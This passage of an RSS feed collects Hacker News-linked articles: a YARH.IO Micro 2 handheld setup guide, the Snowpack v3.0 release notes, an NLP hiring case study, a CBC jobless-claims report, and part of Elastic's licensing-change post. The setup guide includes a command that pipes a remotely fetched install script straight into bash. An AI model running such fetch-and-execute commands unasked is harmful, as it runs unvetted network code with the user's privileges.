                        <p>The outcome of this YARH.IO Micro 2 is a micro-size (116mm x 123mm x 27mm) handheld with the potential to run a unlimited applications and to be extended with an unlimited range of external USB devices. It is portable, has minimalist design, and can be relatively easily 3D printed and assembled.<br></p>
                        <p>The release of YARH.IO Micro 2 marks a new success in our line-up of goals&nbsp;towards the design, development, and release of innovative handhelds for hacking, coding, and creative use by computer experts and enthusiasts.&nbsp;<br></p>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <section id="yarh-io-mki-gallery">
        
    </section>
    <section id="yarh-io-mki-downloads">
        
    </section>
    <section id="yarh-io-mki-assembly-gallery">
        
    </section>
    <section id="yarh-io-mki-software">
        <div>
            <div>
                <p id="heading-software">
                    <h2>System &amp; Software<br></h2>
                </p>
                <div>
                    <div>
                        <div>
                            <h4>Software packages</h4><p><code>sudo apt install tmux vim mc -y<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>HyperPixel screen</h4><p><code>curl -sSL https://get.pimoroni.com/hyperpixel4 | bash<br></code><code>hyperpixel4-rotate right<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>Turn off HyperPixel on shutdown</h4>
                            <p>The original link:&nbsp;https://github.com/pimoroni/hyperpixel4/issues/3. Thank you&nbsp;Florian Mirkes.<br></p><p><code># Create&nbsp;/etc/systemd/system/hyperpixel4-backlight.service and add the following:<br></code><code>[Unit]<br>Description=Sets up gpio-poweroff to handle Hyperpixel backlight upon shutdown/reboot<br>ConditionPathExists=/usr/bin/hyperpixel4-init<br>ConditionPathExists=/boot/overlays/gpio-poweroff.dtbo<br>ConditionPathExists=/usr/bin/dtoverlay<br>DefaultDependencies=no<br>Before=umount.target<br>[Service]<br>Type=oneshot<br>ExecStart=/bin/sh -c '/sbin/rmmod gpio-backlight;/usr/bin/dtoverlay /boot/overlays/gpio-poweroff.dtbo gpiopin=19 active_low=1'<br>[Install]<br>WantedBy=reboot.target halt.target poweroff.target<br></code><code>sudo systemctl enable hyperpixel4-backlight.service<br></code><code>sudo systemctl start hyperpixel4-backlight.service<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>Enable right-click for the Raspberry Pi touchscreen</h4>
                            <p>The original article :&nbsp;https://fmirkes.github.io/articles/20190827.html. Thank you&nbsp;Philip Howard.<br></p><p><code>sudo apt install build-essential libevdev2 libevdev-dev -y<br></code><code>git clone 'https://github.com/PeterCxy/evdev-right-click-emulation.git'<br></code><code>cd 'evdev-right-click-emulation'<br></code><code>make all<br></code><code>sudo cp 'out/evdev-rce' '/usr/local/bin/'<br></code><code>sudo chmod +x '/usr/local/bin/evdev-rce'<br></code><code># Add evdev-rce to startup<br></code><code>sudo usermod -G 'input' -a pi<br></code><code>echo 'uinput' | sudo tee -a /etc/modules<br></code><code># Edit: /etc/udev/rules.d/99-uinput.rules<br></code><code>KERNEL=="uinput", MODE="0660", GROUP="input"<br></code><code>sudo udevadm control --reload-rules<br></code><code>sudo udevadm trigger<br></code><code>mkdir ~/.config/autostart<br></code><code># Create: ~/.config/autostart/evdev-rce.desktop and add the following:<br></code><code>[Desktop Entry]<br>Version=1.0<br>Type=Application<br>Name=evdev-rce<br>GenericName=Enable long-press-to-right-click gesture<br>Exec=env LONG_CLICK_INTERVAL=500 LONG_CLICK_FUZZ=50 /usr/local/bin/evdev-rce<br>Terminal=true<br>StartupNotify=false<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>RTC</h4><p><code># Create: ~/.rtc-init.sh and add the following:<br></code><code>echo "ds1307 0x68" | sudo -E tee -a /sys/bus/i2c/devices/i2c-11/new_device<br></code><code>sudo chmod +x ~/.rtc-init.sh<br></code><code># Create&nbsp;~/.config/autostart/rtc-init.desktop and add the following:<br></code><code>[Desktop Entry]<br>Version=1.0<br>Type=Application<br>Name=rtc-init<br>GenericName=Initialize ds3231 RTC on non standard i2c-11 bus, address 0x68<br>Exec=sh /home/pi/.rtc-init.sh<br>Terminal=true<br>StartupNotify=false<br></code>
                        </p></div>
                    </div>
                </div>
                <div>
                    <div>
                        <div>
                            <h4>Bluetooth Keyboard</h4>
                            <p>To connect Bluetooth keyboard for the first time use Bluetooth icon on the menu bar and select Add device. Press hard the Blue Bluetooth button on the keyboard, blue light on the keyboard starts blinking. The keyboard icon and name Bluetooth Keyboard should appear in the …</p></div></div></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://yarh.io/yarh-io-m2.html">https://yarh.io/yarh-io-m2.html</a></em></p>]]>
            </description>
            <link>https://yarh.io/yarh-io-m2.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780972</guid>
            <pubDate>Thu, 14 Jan 2021 19:22:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Snowpack v3.0]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25780589">thread link</a>) | @dsego
<br/>
January 14, 2021 | https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0 | <a href="https://web.archive.org/web/*/https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article>
      <p>Snowpack v3.0 is here! This is our biggest release yet with brand new features including:</p>
<ul>
<li><strong>Pre-bundled streaming imports</strong> - Import any npm package, on-demand.</li>
<li><strong>Integrated build optimizations</strong> - Built-in bundling, preloading, minification, and more.</li>
<li><strong>JavaScript API</strong> - Integrate with Snowpack’s brand new native JS API.</li>
<li><strong>Node.js Runtime API</strong> - Import your Snowpack-built files directly into Node.js.</li>
<li><strong>Bug fixes, stability improvements, and a whole lot more!</strong></li>
</ul>
<p>Install the newest version of Snowpack to get started:</p>
<pre><code>$ npm install snowpack@^3.0.0
</code></pre>
<p>Or, try out one of our updated <a href="https://www.npmjs.com/package/create-snowpack-app">Create Snowpack App</a> starter templates:</p>
<pre><code>$ npx create-snowpack-app new-project-directory --template  @snowpack/app-template-react
</code></pre>
<h2 id="reimagining-web-development-for-esm">Reimagining Web Development for ESM</h2>
<p>1 year ago, Snowpack first released with the mission to reimagine web development for modern JavaScript and ESM. Snowpack leverages modern web features to deliver a frontend build tool that needs just 50ms to start up &amp; react to new file changes, regardless of project size. In comparison, traditional web bundlers could take several seconds or even full minutes to start up in large projects.</p>
<p>Snowpack v3.0 marks another huge leap on our mission to push web development forward with the release of <strong>streaming imports</strong>. Streaming imports make it possible to import any package directly into your project, pre-built and pre-bundled for immediate use. It’s the power of the entire JavaScript ecosystem, at your fingertips.</p>
<video preload="auto" autoplay="" loop="" muted="" playsinline="">
 <source src="https://www.snowpack.dev/img/streaming-imports-demo.webm" type="video/webm">
 <source src="https://www.snowpack.dev/img/streaming-imports-demo.mp4" type="video/mp4">
</video>
<h2 id="what-are-streaming-imports%3F">What are Streaming Imports?</h2>
<p>The typical web developer installs and manages their JavaScript dependencies locally using a package manager CLI like <code>npm</code>, <code>yarn</code> or <code>pnpm</code>. These npm packages can’t run directly in the browser, so additional work is needed to resolve, process, build and bundle these packages for the browser before you can actually use them.</p>
<p><strong>What if we could simplify this? What if you could skip the “npm install” step entirely and just fetch the relevant, pre-built package code on-demand via ESM import?</strong></p>
<pre><code><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'react'</span><span>;</span><p><br><span>import</span> <span>*</span> <span>as</span> React <span>from</span> <span>'https://cdn.skypack.dev/react@17.0.1'</span><span>;</span></p></code></pre>
<p>That URL in the example above points to <a href="https://www.skypack.dev/">Skypack</a>, a popular JavaScript CDN that we built to serve every package&nbsp;on npm as ESM. Importing dependencies by URL like this is well supported in Snowpack, Deno, and all major browsers. But writing these URLs directly into your source code isn’t ideal and makes development impossible without a network connection.</p>
<p><strong>Snowpack v3.0 brings together the best of both worlds:</strong> Get the simplicity of <code>import 'react'</code> in your own source code and let Snowpack fetch these dependencies behind the scenes, pre-built and ready to run in the browser. Snowpack caches everything for you automatically, so you can continue to work offline after the first package fetch.</p>
<p>This new workflow has several benefits over the traditional “npm install” approach:</p>
<ul>
<li><strong>Speed:</strong> Skip the install + build steps for dependencies, and load your dependencies on-demand as pre-build, pre-bundled ESM code.</li>
<li><strong>Safety:</strong> ESM packages are pre-built into JavaScript for you and never given access to <a href="https://www.usenix.org/system/files/sec19-zimmermann.pdf">run code on your machine</a>. Third-party code only ever runs sandboxed in the browser.</li>
<li><strong>Less Tooling:</strong> ESM packages are managed by Snowpack, so frontend projects that don’t need Node.js (Rails, PHP, etc.) can drop the npm CLI entirely if they choose.</li>
<li><strong>Identical Final Build:</strong> When you build your site for production, package code is transpiled with the rest of your site and tree-shaken to your exact set of imports.</li>
</ul>
<p>This is our bet on the future of web development. But if this all sounds too wild for you or you have some technical reason to keep managing your dependencies with npm, don’t worry. This is <strong>100% opt-in</strong> behavior for those who want it. By default, Snowpack will continue to pull your npm package dependencies out of your project <code>node_modules</code> directory like it always has.</p>
<p>Check out our guide on <a href="https://www.snowpack.dev/guides/streaming-imports">Streaming Package Imports</a> to learn more about how to enable this new behavior in your project today.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-esbuild.png" alt="js api"></p>
<h2 id="built-in-optimizations%2C-powered-by-esbuild">Built-in Optimizations, Powered by esbuild</h2>
<p><a href="https://esbuild.github.io/">esbuild</a> is a marvel: it performs 100x faster than most other popular bundlers their own benchmarks. esbuild is written in Go, a compiled language that can parallelize heavy bundling workloads where other popular bundlers – written in JavaScript – cannot.</p>
<p>Snowpack already uses esbuild internally as our default single-file builder for JavaScript, TypeScript and JSX files. Snowpack v3.0 takes this integration one step further, with a new built-in build optimization pipeline. Bundle, minify, and transpile your site for production in 1/100th of the time of other bundlers.</p>
<p>Snowpack is able to adopt esbuild today thanks to an early bet that we made on the future of bundling: <strong>bundling is just a post-build optimization.</strong> Thanks to this early design decision, esbuild can be plugged in and swapped out of your Snowpack build as easily as any other bundler.</p>
<p>esbuild is still a young project, but its future looks promising. In the meantime, we will also continue to invest in the existing bundler plugins for a long time to come, so that more mature projects can continue to use mature bundlers like Webpack &amp; Rollup.</p>
<p>To get started, check out the <code>optimize</code> option in our newest <a href="https://www.snowpack.dev/guides/optimize-and-bundle">Optimizing Your Snowpack Build</a> guide.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-jsapi.png" alt="js api"></p>
<h2 id="a-new-javascript-api">A New JavaScript API</h2>
<p>Snowpack’s new JavaScript API grants you more advanced control over Snowpack’s dev server and build pipeline, helping you build more powerful integrations on top of Snowpack to unlock new kinds of dev tooling and server-side rendering (SSR) solutions.</p>
<p><a href="https://svelte.dev/blog/whats-the-deal-with-sveltekit">SvelteKit</a> is the new official web app framework from the Svelte team, built with Snowpack. SvelteKit uses our new JavaScript API to manage the build pipeline and build files on-demand. Snowpack helps SvelteKit speed up development, with zero rapid updates on file change and zero upfront server start-up cost.</p>
<p><a href="https://www.npmjs.com/package/microsite">Microsite</a> is another exciting new project built with Snowpack. Microsite is a Static Site Generator (SSG) for Preact that features automatic partial hydration, so that you send as little JavaScript down to the client as possible.</p>
<p>Check out our new <a href="https://www.snowpack.dev/reference/javascript-interface">JavaScript API reference</a> to start building your own custom integrations on top of Snowpack.</p>
<p><img src="https://www.snowpack.dev/img/post-snowpackv3-runtime.png" alt="js api"></p>
<h2 id="a-new-node.js-runtime">A New Node.js Runtime</h2>
<p>Speaking of Svelte, this next feature comes directly out of our collaboration with the Svelte team. As a part of building out SvelteKit, Rich Harris created a server-side runtime for Snowpack. This runtime lets you import any Snowpack-built file directly into Node.js, handling things like ESM-&gt;CJS conversion and CSS extraction automatically.</p>
<p>The result is a unified build pipeline across both Node.js and the frontend, with all of the on-demand build performance benefits of Snowpack. Importing frontend code to run in Node.js unlocks features like true server-side rendering (SSR), test runner integrations for Jest/uvu/Mocha, and more.</p>
<p>Check out our new <a href="https://www.snowpack.dev/guides/server-side-render">SSR guide</a> to get started and learn more about all of the different ways that you can connect to your Snowpack build.</p>
<p>🥳</p>
<h2 id="snowpack%E2%80%99s-one-year-anniversary">Snowpack’s One Year Anniversary</h2>
<p>Last week marked Snowpack’s one-year anniversary of the original v1.0.0 release. Looking back, I’m blown away by everything that’s happened since:</p>
<ul>
<li>150+ releases (from <code>v0.0.1</code>, all the way to v3.0 today)</li>
<li><a href="https://www.snowpack.dev/plugins">100+ Snowpack plugins</a> to choose from (and growing fast!)</li>
<li><a href="https://github.com/snowpackjs/snowpack/graphs/contributors">100+ individual contributors</a></li>
<li><a href="https://github.com/snowpackjs/snowpack/stargazers">15,000+ stars on GitHub</a></li>
<li>#1 Developer Productivity Boost Winner, <a href="https://osawards.com/javascript/2020">2020 JS Open Source Awards</a></li>
<li>#1 Highest Developer Interest, <a href="https://2020.stateofjs.com/en-US/technologies/build-tools/">2020 State of JS</a></li>
<li>#1 Highest Developer Satisfaction (tied), 2020 State of JS</li>
</ul>
<p>A huge thank you to everyone who has contributed code to Snowpack, and the hundreds of developers joining us on GitHub and on <a href="https://discord.com/invite/snowpack">Discord</a>. This project wouldn’t exist today without you and your support. Thank you!</p>
<p>– Fred K. Schott <a href="https://twitter.com/FredKSchott">(@FredKSchott)</a></p>

    </article>
    </div></div>]]>
            </description>
            <link>https://www.snowpack.dev/posts/2021-01-13-snowpack-3-0</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780589</guid>
            <pubDate>Thu, 14 Jan 2021 18:59:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Reducing Time-to-Hire and Finding Niche Candidates via Text Mining and NLP]]>
            </title>
            <description>
<![CDATA[
Score 32 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25780588">thread link</a>) | @cl42
<br/>
January 14, 2021 | https://joinphase.com/talent-acquisition-nlp | <a href="https://web.archive.org/web/*/https://joinphase.com/talent-acquisition-nlp">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>

   

    <p>Reducing Time-to-Hire and Finding Niche Candidates via Text Mining and NLP

    </p>
    
  </div>
</div><div>
  <div>

   

    <div>

<p><b>Summary:</b> Maison Battat, a global toy company, recently hired a uniquely qualified data science candidate in only 26 days. Phase describes how we worked with Maison Battat to build a text mining (i.e., “Natural Language Processing” or “NLP”) approach that could scan 1,000s of candidates in minutes and look for unique attributes and experiences shared by applicants and broader candidate pools alike.

</p><p>Skip to: <a href="#problem">Problem</a> | <a href="#solution">Solution</a> | <a href="#results">Result</a> | <a href="#quotes">Quotes</a>

    </p></div>

    </div>

    
  </div><div>
  <div>

   

    <div>

<p><a name="problem"></a>The Problem: too many candidates and poor screening options

</p><p>Most applicant screening systems are limited in how they enable searching and filtering of candidates. This means that they rarely allow you to include unique combinations of skills or score candidate profiles in a more flexible manner.

</p><p>Worse still, many job applications have <i>hundreds</i> or <i>thousands</i> of applicants. If you expand this to a passive pool, you can be looking at 10,000+ candidates for a single role. Hiring managers and recruiters struggle with reviewing so many profiles, and resort to keyword searches.

</p><p><a name="solution"></a>Our Solution: use recent advances in text mining to make candidate searches descriptive and holistic

</p><p>To address the challenge above, Phase uses two strategies to solve this problem.

</p><p><b>1. Make the search a conversational process</b>

</p><p>Rather than simply providing keywords, we ask recruiters to use a freeform description of the candidate they are looking for. To use the Battat example above...

</p><center>
<div><p>
A conventional exact-match keyword search might look like:</p><p>&nbsp;

“<span>Python</span>”, “<span>SQL</span>”, “<span>analyst</span>”, “<span>engineer</span>” or “<span>toys</span>”
</p><p>&nbsp;
But through our search, the candidate is described as:
</p><p>&nbsp;
“A <span>data scientist</span> who has with experience with
 <span>toys</span>, <span>education</span>, or <span>children’s products</span>.”
</p></div>
</center>

<p>We use descriptions because our search understands concepts and ideas. The algorithm knows that a “<span>data scientist</span>” is a person that is likely to know languages like “<span>Python</span>”, “<span>SQL</span>”, or others and takes on roles such as an “<span>analyst</span>” or “<span>engineer</span>”. By teaching the algorithm to seek out candidates who have experience with “<span>toys</span>”, “<span>education</span>” and “<span>children’s products</span>”, we can find people with relevant experience in related areas like “gaming” or “youth development”.

</p><p>Another way to think about this interface is that the recruiter simply has to <i>write</i> an answer to the question, “What sort of candidate are you looking for?” You need not worry about the specific structure of your response, or fitting keywords into specific parts of a search form. The above example could easily be “A former toy designer interested in analytics” or “A multilingual French-speaker who can design products and analyze data.”

</p><p>Our goal is to give the algorithm an idea of what type of candidate to look for. It will identify and make connections between concepts to find the strongest candidates. It is not limited by specific keywords. This means that a recruiter or hiring manager saves time by automating searches, while generating a broader diversity of qualified candidates.

</p><p><b>2. Search the whole resume, not just skills lists or keywords</b>

</p><p>Our semantic approach makes it easier for us to scan an entire resume to understand the person as a whole. For instance, a candidate might outline an interest in “children’s products” in one part of their resume, but not include this in their core skillsets elsewhere. This semantic approach tracks the <i>entire</i> resume and scores the <i>themes</i> that come up rather than just individual skills or keyword flags.

</p><p><a name="results"></a>The Result: 26 Days for Time-to-Hire and a Great Candidate Experience

</p><p>Maison Battat is a family-owned toy company that encourages kids to be bold, curious, and playful. For over 45 years, they have offered a range of engaging toys for babies, toddlers, and young children including Driven™ tough trucks to dolls of Our Generation™.

</p><p>Battat wanted to hire a unique candidate with experience in marketing, e-commerce, data science and analytics. They sought out someone who was a self-starter, fast learner, proficient in another language, has lived abroad, and shares their passion for improving the lives of children through play and education.

</p><p>Our text mining approach above was used to analyze over 1,000 data science candidate profiles. The top result was Sogra, a bilingual data analyst with international experience. Importantly, she was the ultimate self-starter having created an award-winning smart toy while she was working at a toy startup.

</p><p>Sogra was the first and only candidate interviewed – she was perfect for the role. Not only was the role filled in 26 days, but both employer and employee were thrilled with the significantly easier process and speedy approach.

    </p></div>

    </div>

    
  </div><div>
   <div>

     

     <div>

<p>“Phase reached out to me about a data analyst role at a toy company. Two weeks after I was introduced to the hiring manager, I accepted their job offer. I’m excited to have a data role that leverages my background as a toy designer. I feel amazing!”

</p><center></center>

<center><img src="https://joinphase.com/person_sogra.jpg"></center>

     </div>

     <div>

<p>“Phase has been a fantastic talent partner for our company. We hired the first candidate they sent us -- she was experienced in our industry and had a great analytics background. We went from first candidate introduction to first day on the job in 26 days.”

</p><center><p>Guillaume<br>Head of Amazon Business Unit,<br>Maison Battat<br>&nbsp;</p></center>

<center><img src="https://joinphase.com/person_guillaume.jpg"></center>

     </div>

     

    </div>
  </div></div>]]>
            </description>
            <link>https://joinphase.com/talent-acquisition-nlp</link>
            <guid isPermaLink="false">hacker-news-small-sites-25780588</guid>
            <pubDate>Thu, 14 Jan 2021 18:58:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[U.S. jobless numbers surge as worsening Covid-19 pandemic hurts businesses]]>
            </title>
            <description>
<![CDATA[
Score 63 | Comments 92 (<a href="https://news.ycombinator.com/item?id=25778289">thread link</a>) | @heyheyheysome
<br/>
January 14, 2021 | https://www.cbc.ca/news/business/us-jobless-numbers-1.5872817 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/business/us-jobless-numbers-1.5872817">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The number of Americans filing first-time applications for unemployment benefits surged last week, confirming a weakening in labour market conditions as a worsening COVID-19 pandemic disrupts operations at restaurants and other businesses.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5872837.1610635730!/fileImage/httpImage/image.JPG_gen/derivatives/16x9_780/usa-smallbusiness-ppp.JPG"></p></div><figcaption>A woman walks past a business that is closing in New York City in August. Initial claims for state unemployment benefits totalled a seasonally adjusted 965,000 for the week ended Jan. 9, compared to 784,000 in the prior week, the U.S. Labour Department said on Thursday.<!-- --> <!-- -->(Carlo Allegri/Reuters)</figcaption></figure><p><span><p>The number of Americans filing first-time applications for unemployment benefits surged last week, confirming a weakening in labour market conditions as a worsening COVID-19 pandemic disrupts operations at restaurants and other businesses.</p>  <p>Initial claims for state unemployment benefits totalled a seasonally adjusted 965,000 for the week ended Jan. 9, compared to 784,000 in the prior week, the U.S. Labour Department said on Thursday. Economists polled by Reuters had forecast 795,000 applications in the latest week.</p>  <p>It's the highest number since late August.&nbsp;Applications declined over the summer but have been stuck above 700,000 since September.</p>  <p>Claims were also likely lifted by re-applications for benefits following the government's renewal of a $300 US unemployment supplement until March 14 as part of nearly $900 billion in additional relief approved at the end of December.</p>    <p>Government-funded programs for the self-employed, gig workers and others who do not qualify for the state unemployment programs as well as those who have exhausted their benefits were also extended.</p>  <p>Authorities in many states have banned indoor dining to slow the spread of the coronavirus. The economy shed jobs in December for the first time in eight months.</p>  <p>The Federal Reserve's Beige Book report of anecdotal information on business activity collected from contacts nationwide in early January showed on Wednesday that "contacts in the leisure and hospitality sectors reported renewed employment cuts due to stricter containment measures."</p>  <p>The central bank also noted that the resurgence in the coronavirus was causing staff shortages in the manufacturing, construction and transportation&nbsp;sectors.</p>  <h2>Most infections of any country</h2>  <p>The virus has infected more than 22.5 million people in the United States and killed over 376,188, the most of any country.&nbsp;More than 4,300 deaths were reported Tuesday, a&nbsp;record high.</p>  <p>Though jobless claims have dropped from a record 6.867 million in March, they remain above their 665,000 peak during the 2007-09 Great Recession. Economists say it could take several years for the labour market to recover from the pandemic.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_300/health-coronavirus-usa-florida.JPG 300w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_460/health-coronavirus-usa-florida.JPG 460w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_620/health-coronavirus-usa-florida.JPG 620w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/health-coronavirus-usa-florida.JPG 780w,https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_1180/health-coronavirus-usa-florida.JPG 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5859227.1609502755!/fileImage/httpImage/image.JPG_gen/derivatives/original_780/health-coronavirus-usa-florida.JPG"></p></div><figcaption>Hundreds wait in line to receive the COVID-19 vaccine in Fort Myers, Fla., in late December. Economists are hopeful the economy will turn around in late 2021.<!-- --> <!-- -->(Andrew West/The News-Press/USA Today Network/Reuters)</figcaption></figure></span></p>  <p>"While prospects for the economy later in 2021 are upbeat, the labour market recovery has taken a step backward," said Nancy Vanden Houten, an economist at Oxford Economics, "and we expect claims to remain elevated, with the risk that they rise from last week's levels."</p>  <p>Last week's applications for aid might have been elevated in part because state employment offices had been closed over the holidays, requiring some jobless people to wait until last week to apply.&nbsp;</p>  <h2>5.3 million Americans receiving jobless benefits</h2>  <p>In addition to last week's first-time applications for unemployment aid, the government said Thursday that 5.3 million Americans are continuing to receive state jobless benefits, up from 5.1 million in the previous week. It suggests that fewer people who are out of work are finding jobs.</p>  <p>About 11.6 million people received jobless aid from two federal programs in the week that ended Dec. 26, the latest period for which data is available. One of those programs provides extended benefits to people who have exhausted their state aid. The other supplies benefits to self-employed and contract workers.</p>  <p>Those two programs had expired near the end of December. They were belatedly renewed, through mid-March, in the $900-billion rescue aid package that Congress approved and President Donald Trump signed into law. That legislation also included $600 relief cheques&nbsp;for most adults and a supplemental unemployment benefit payment of $300 a week. Congressional Democrats favour boosting the cheques&nbsp;to $2,000 and extending federal aid beyond March, as does president-elect Joe Biden.</p>    <p>The U.S. job market's weakness was made painfully clear in the December employment report that the government issued last week. Employers shed jobs for the first time since April as the pandemic tightened its grip on consumers and businesses.</p>  <p>The figures also depicted a sharply uneven job market: The losses last month were concentrated among restaurants, bars, hotels and entertainment venues. Educational services, mostly colleges and universities, also cut workers in December. So did film and music studios.</p>  <p>Most other large industries, though, reported job gains. Many economists had expected last spring that job losses would spread to more industries. Though all sectors of the economy initially laid off workers, most of them have avoided deep job cuts. Manufacturing, construction, and professional services like engineering and architecture, for example, all added jobs in December.</p>  <p>At the same time, many companies seem reluctant to sharply ramp up hiring. A government report Tuesday showed that employers advertised fewer open jobs in November than in October. The decline, while small, was widespread across most industries.</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/business/us-jobless-numbers-1.5872817</link>
            <guid isPermaLink="false">hacker-news-small-sites-25778289</guid>
            <pubDate>Thu, 14 Jan 2021 16:28:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Licensing changes to Elasticsearch and Kibana]]>
            </title>
            <description>
<![CDATA[
Score 289 | Comments 359 (<a href="https://news.ycombinator.com/item?id=25776657">thread link</a>) | @sl_
<br/>
January 14, 2021 | https://www.elastic.co/blog/licensing-change | <a href="https://web.archive.org/web/*/https://www.elastic.co/blog/licensing-change">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><h2>Upcoming licensing changes to Elasticsearch and Kibana</h2><p>We are moving our Apache 2.0-licensed source code in Elasticsearch and Kibana to be dual licensed under Server Side Public License (SSPL) and the Elastic License, giving users the choice of which license to apply. This license change ensures our community and customers have free and open access to use, modify, redistribute, and collaborate on the code. It also protects our continued investment in developing products that we distribute for free and in the open by restricting cloud service providers from offering Elasticsearch and Kibana as a service without contributing back. This will apply to all maintained branches of these two products and will take place before our upcoming 7.11 release. Our releases will continue to be under the Elastic License as they have been for the last three years.
</p><p>This change in source code licensing has <b>no impact on the overwhelming majority of our user community</b> who use our default distribution for free. It also has <b>no impact on our cloud customers or self-managed software customers</b>.</p><p>In recent years, the market has evolved, and the community has come to appreciate that open source companies need to better protect their software to continue to innovate and make the investments required. As companies continue the shift to SaaS offerings, some cloud service providers have taken open source products and provided them as a service without investing back into the community. Moving to the dual license strategy with <a href="https://www.mongodb.com/licensing/server-side-public-license">SSPL</a> or the Elastic License is a natural next step for us after opening our commercial code and creating a free tier, all under the Elastic License, nearly 3 years ago. It is similar to those made by many other open source companies over these years, including <a href="https://www.mongodb.com/licensing/server-side-public-license/faq">MongoDB</a>, which developed the SSPL. The SSPL allows free and unrestricted use, as well as modification, with the simple requirement that if you provide the product as a service, you must also publicly release any modifications as well as the source code of your management layers  under SSPL.
</p><h2>Our open origins</h2><p>My personal journey with open source goes a long way back. In 2005, I open sourced my first project, Compass, to provide a Java framework on top of Apache Lucene while I was building a recipe app for my wife. In the following five years, I invested many weekends and nights working on it, from writing code to helping users with bugs, features, and questions.
</p><p>I had no idea what I was signing up for, especially with a day job “on the side,” but I fell in love with the opportunity to make such a positive impact — trying to build a great product, but more importantly, a great community around it, through the power of open source.
</p><p>In 2009, I decided to do it again, and started to write a brand new project called Elasticsearch. I spent many nights and weekends building it, and in 2010 open sourced it. I even quit my job and decided to dedicate my full attention to it. To be there for the users, through writing code, and engaging on GitHub, mailing lists, and IRC.
</p><p>And when we founded Elastic as a company in 2012, we brought the same spirit to our company. We invested heavily in our free and open products, and supported the rapid growth of our community of users. We expanded from just Elasticsearch to Kibana, Logstash, Beats, and now a complete set of solutions built into the Elastic Stack: Elastic Enterprise Search, Observability, and Security.
</p><p>We have matured the products, fostered vibrant communities around them, and focused on providing the greatest amount of value to our users. Today, we have hundreds of engineers who wake up every day and work to make our products even better. And we have hundreds of thousands of community members who engage with us and contribute to our shared success.
</p><p>I am proud of the company we built, and humbled by the level of trust that we have earned with our user base. This starts by being open and transparent, and continues with being true to our community and user base in our choices.
</p><h2>Free and open FTW</h2><p>Back in 2018, we <a href="https://www.elastic.co/blog/doubling-down-on-open">opened the code of our free and paid proprietary features</a> under the Elastic License, a source-available license, and we changed our default distribution to include all of our features, with all free features enabled by default.
</p><p>We did this for a few reasons. It allowed us to engage with our paying customers in the same way we engage with our community: in the open. It also allowed us to build free features that empower our users without providing those capabilities to companies that take our products and provide them as a service, like Amazon Elasticsearch Service, and profit from our open source software without contributing back.
</p><p>This approach was well received — today, over 90% of new downloads choose this distribution — and has allowed us to make so much of our work available for free while also building a successful company.
</p><p>The list of improvements under this new free and open, yet proprietary, license, is overwhelming. I am humbled by the amazing progress our team and community has made across all our products, so much so that I would love to share some of them:
</p><p>We've dramatically improved the speed, scalability, and reliability of Elasticsearch, with a new distributed consensus algorithm and significantly reduced memory usage, in addition to new data storage and compression approaches that have reduced the typical index size by nearly 40% while improving indexing and query throughput. We added new field types for geospatial analysis, and more efficient ways to store and search logs and perform fast, case-insensitive search on security data. In Kibana, we cut load time by 80% and eliminated whole-page refreshes thanks to a multiyear replatforming project, while at the same time introducing an intuitive drag-and-drop data visualization experience with Kibana Lens, key capabilities like dashboard drill-downs, and so much more.
</p><p>Over the last three years, we also built first-class experiences around our most common use cases. In the security area, we created a free and open SIEM right inside Kibana, with a powerful detection engine that supports simple rules as well as complex correlations via a new query language called EQL in Elasticsearch. We include hundreds of detection rules, which we develop publicly, in collaboration with our community. And we joined forces with Endgame, a leading endpoint security company, and have released powerful malware protection for free as part of the Elastic Agent, our unified, centrally managed observability and security agent for servers and endpoints, with more to come.
</p><p>In observability, the story is similar. We've built an entire observability suite right inside Kibana — from a live-tail logging UI to an intuitive infrastructure-level view of the key metrics and alerts across your hosts, pods, and containers. And we now have a fully featured APM product with open source data collectors and agents, supporting OpenTelemetry, real user monitoring (RUM), synthetic monitoring, and the recent addition of user experience monitoring.
